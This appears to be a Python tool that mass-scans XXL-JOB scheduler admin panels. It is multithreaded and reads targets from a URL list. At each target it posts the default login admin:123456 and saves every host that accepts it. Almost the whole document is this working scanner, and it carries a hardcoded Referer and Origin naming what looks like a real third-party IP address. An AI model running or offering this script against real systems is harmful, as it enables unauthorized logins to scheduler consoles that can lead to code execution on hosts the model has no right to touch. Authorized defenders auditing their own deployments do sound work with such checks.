# author:"404_fu"
# date:2024-03-25 22:19
import argparse
import textwrap
import concurrent.futures
import functools
import time
import colorama
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def title():
    print(colorama.Fore.BLUE+'[+]  功  能: XXL-JOB 默认口令检测')
    print(colorama.Fore.RED+'[+]   警  告: 漏洞仅限本地复现使用,请遵守网络安全法律法规,违者使用与本程序开发者无关\n')

def payload(url):
    # 1. 请求
    full_url = f"{url}/login"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
                     "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                     "Accept-Encoding": "gzip, deflate", "Referer": "http://58.144.199.152:7005/toLogin",
                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "Origin": "http://58.144.199.152:7005",
                     "Connection": "close"}
    data = {"userName": "admin", "password": "123456"}
    try:
        response = requests.post(full_url, headers=headers, data=data, verify=False, allow_redirects=False, timeout=7)
    #2.漏洞验证
        if response.status_code == 200 and response.json().get("msg") is None:
            print(colorama.Fore.YELLOW+f"[+]{url} 存在默认口令 admin:123456")
            return True  # 存在弱口令
    except Exception:
        print(f"[-] {url} 请求失败")
    return False  # 不存在弱口令或请求失败

def call_back(future, url, res_lst):
    try:
        # 获取future的结果
        result = future.result()
        # 如果payload返回True，表示存在弱口令，则将URL添加到结果列表中
        if result:
            res_lst.append(url)
    except Exception as e:
        # 处理异常
        print(f"Error occurred while processing {url}: {e}")


def main(file, output, num, url=None):
    start_time = time.time()
    res_lst = []  # 初始化结果列表

    # 如果提供了单个URL，则直接扫描该URL
    if url:
        if payload(url):
            res_lst.append(url)
    else:
        # 否则，按原逻辑处理文件中的URL列表
        with concurrent.futures.ThreadPoolExecutor(max_workers=num) as executor:
            with open(file, mode="r", encoding="utf-8") as f:
                for line in f:
                    url_to_scan = line.strip()
                    future = executor.submit(payload, url_to_scan)
                    # 使用 functools.partial 来创建一个带有固定参数的新函数
                    future.add_done_callback(functools.partial(call_back, url=url_to_scan, res_lst=res_lst))
                    # 将结果写入输出文件
    with open(output, mode="w", encoding="utf-8") as f:
        for url in res_lst:
            f.write(f"{url}\n")

    print(f"任务结束总耗时: {time.time() - start_time} s")

if __name__ == '__main__':
    banner = """
 __   ____   ___              _  ____  ____   _____                 
 \ \ / /\ \ / / |            | |/ __ \|  _ \ / ____|                
  \ V /  \ V /| |  ______    | | |  | | |_) | (___   ___ __ _ _ __  
   > <    > < | | |______|   | | |  | |  _ < \___ \ / __/ _` | '_ \ 
  / . \  / . \| |____   | |__| | |__| | |_) |____) | (_| (_| | | | |
 /_/ \_\/_/ \_\______|   \____/ \____/|____/|_____/ \___\__,_|_| |_|
                                                                    
                                                      Author：404_fu                                                             
       """
    print(colorama.Fore.GREEN+banner)
    title()
    # 使用argparse去解析命令行传来的参数
    parser = argparse.ArgumentParser(description="xxl-job 弱口令批量检测脚本",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
               python XXL-JOBScan.py -f url.txt -o res.txt -n 30
               python XXL-JOBScan.py -u http://target.com
           '''))
    # 添加参数
    parser.add_argument("-u", "--url", dest="url", type=str, help="single URL to scan")
    parser.add_argument("-f", "--file", dest="file", type=str, help="input file path")
    parser.add_argument("-o", "--output", dest="output", type=str, help="save file path", default="res.txt")
    parser.add_argument("-n", "--num", dest="num", type=int, help="thread num", default=20)
    # 把参数的值解析到对象中
    args = parser.parse_args()
    # 调用main函数，传入url参数（如果有的话）
    if args.url:
        main(None, args.output, args.num, url=args.url)
    else:
        main(args.file, args.output, args.num)